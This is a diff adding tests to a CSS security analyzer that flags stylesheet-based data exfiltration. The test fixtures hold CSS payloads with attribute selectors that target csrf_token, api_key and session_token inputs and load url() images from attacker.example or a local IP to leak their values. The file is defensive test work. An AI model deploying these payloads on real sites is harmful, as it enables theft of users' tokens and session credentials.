@@ -110,4 +110,36 @@ describe("core analyzer", () => {
     expect(analyze('@import url("https://attacker.example/import.css");').findings.length).toBeGreaterThan(0);
   });
 
+  it("scans oversized stylesheets instead of reporting a too-large skip", () => {
+    const padding = Array.from({ length: 16_000 }, (_, index) => `.pad-${index}{margin:${index % 17}px}`).join("\n");
+    const summary = analyze(`${padding}\ninput[name="csrf_token"][value^="z"]{background-image:url("https://attacker.example/oversized-z")}`);
+    expect(summary.state).not.toBe("analysis.skipped.too_large");
+    expect(summary.partialStylesheets).toBe(0);
+    expect(summary.analyzedStylesheets).toBe(1);
+    expect(summary.findings.some((finding) => finding.reasons.includes("analysis.skipped.too_large"))).toBe(false);
+    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
+  });
+
+  it("continues scanning after the report cap and retains stronger later findings", () => {
+    const noisyRemoteFindings = Array.from({ length: 20 }, (_, index) => `input[value^="${String.fromCharCode(97 + (index % 26))}"]{background-image:url("https://attacker.example/noise-${index}")}`).join("\n");
+    const summary = analyzeStylesheet({
+      cssText: `${noisyRemoteFindings}\ninput[name="api_key"][value^="x"]{background-image:url("http://192.168.0.12/leak")}`,
+      pageUrl,
+      sourceKind: "style_element",
+      sourceUrl: pageUrl,
+      maxFindings: 1,
+    });
+    expect(summary.findings).toHaveLength(1);
+    expect(summary.findings[0].destinationOrigin).toBe("http://192.168.0.12");
+    expect(summary.findings[0].reasons).toContain("url.local_network");
+  });
+
+  it("uses source scanning for oversized nested CSS rules", () => {
+    const padding = Array.from({ length: 16_000 }, (_, index) => `.utility-${index}{display:block}`).join("\n");
+    const summary = analyze(`${padding}\n.card{& input[name="session_token"][value*="abc"]{mask-image:url("https://attacker.example/nested-oversized")}}`);
+    expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.substring_match"))).toBe(true);
+    expect(summary.findings.some((finding) => finding.reasons.includes("css.grouping_rule.nested"))).toBe(true);
+    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
+  });
+
 });
